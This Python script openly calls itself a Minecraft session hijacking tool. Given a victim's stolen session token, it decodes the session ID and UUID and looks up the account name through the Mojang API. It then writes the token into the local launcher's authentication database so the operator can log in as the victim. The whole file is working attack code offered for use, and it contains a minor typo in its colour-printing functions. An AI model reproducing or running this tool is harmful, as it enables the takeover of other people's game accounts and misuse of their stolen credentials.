import base64
import os
import re
import json
import requests
import time

from sys import argv
from colorama import Fore, init

# constants
APPDATA = os.getenv("APPDATA")
PATH = os.path.join(APPDATA, ".minecraft\\launcher_profiles.json")

def get_time():
    return time.strftime("%H:%M:%S")
    
def print_error(message):
    print(f"[{get_time()}] {Fore.RED}[error] {Fore.RESE}{message}{Fore.RESET}")

def print_info(message):
    print(f"[{get_time()}] {Fore.BLUE}[info] {Fore.RESE}{message}{Fore.RESET}")

def print_success(message):
    print(f"[{get_time()}] {Fore.GREEN}[success] {Fore.RESE}{message}{Fore.RESET}")

def validate_token(token):
    if len(token) != 308:
        return
    parts = token.split(".")
    if len(parts) != 3:
        return
    try:
        base64.b64decode(f"{parts[0]}.{parts[1]}=".encode())
    except Exception:
        return
    if not re.match(r"^[a-zA-Z0-9\-_]{43}$", parts[2]):
        return
    return True

def get_name_from_uuid(uuid):
    try:
        res = requests.get(f"https://api.mojang.com/user/profiles/{uuid}/names")
        data = res.json()
        return data[len(data) - 1]["name"]
    except Exception:
        pass

def main():
    init(convert=True)

    print(r"""
{0}                  w           8           
{0} 8d8b.d8b. .d8b   w .d88 .d8b 8.dP            {1}A Minecraft session hijacking
{0} 8P Y8P Y8 8      8 8  8 8    88b             {1}tool written in Python 3 by {2}wodx{1}.
{0} 8   8   8 `Y8P   8 `Y88 `Y8P 8 Yb  {2}v1.0.0
{0}                wdP

 {3}www.twitter.com/wodxgod{0} - {4}www.youtube.com/wodxgod{0} - {5}www.github.com/WodXTV
    {1}""".format(Fore.LIGHTBLACK_EX, Fore.RESET, Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.CYAN))

    try:
        token = argv[1]

        # validate token
        if not validate_token(token):
            print_error("Invalid session token")
            return

        # check if launcher_profiles.json exists
        if not os.path.exists(PATH):
            print_error(f"Failed to locate 'launcher_profiles.json'")
            return

        print_info(f"Reading token data...")

        parts = token.split(".")

        token_data = base64.b64decode(f"{parts[1]}=".encode()).decode()
        token_json = json.loads(token_data)

        session_id = token_json["sub"]
        uuid = token_json["spr"]
        name = get_name_from_uuid(uuid)

        if not name:
            print_error("Failed to get username")
            return

        print_info(f"Target found: '{name}'")
        time.sleep(2)

        profile = {
            session_id: {
                "accessToken": token,
                "profiles": {
                    uuid: {
                        "displayName": name
                    }
                },
                "properties": [],
                "username": name
            }
        }

        print_info(f"Injecting profile to authentication database at: '{PATH}'...")
        time.sleep(2)

        # read launcher_profiles.json
        with open(PATH) as file:
            profiles = json.loads(file.read())

        # get authentication database
        auth_db = profiles["authenticationDatabase"]

        # add new profile to database
        auth_db.update(profile)

        # update authentication database
        profiles["authenticationDatabase"] = auth_db

        # write launcher_profiles.json
        with open(PATH, "w") as file:
            file.write(json.dumps(profiles, indent=2))

        print_success("Session hijacked! You can now launch the Minecraft launcher")

        input("\nPress ENTER to exit...")

    except Exception as e:
        if isinstance(e, IndexError):
            print(f"Usage: py {argv[0]} <session token>")
        else:
            print_error(f"Something went wrong: {str(e)}")

if __name__ == "__main__":
    try:
        main()
    except:
        pass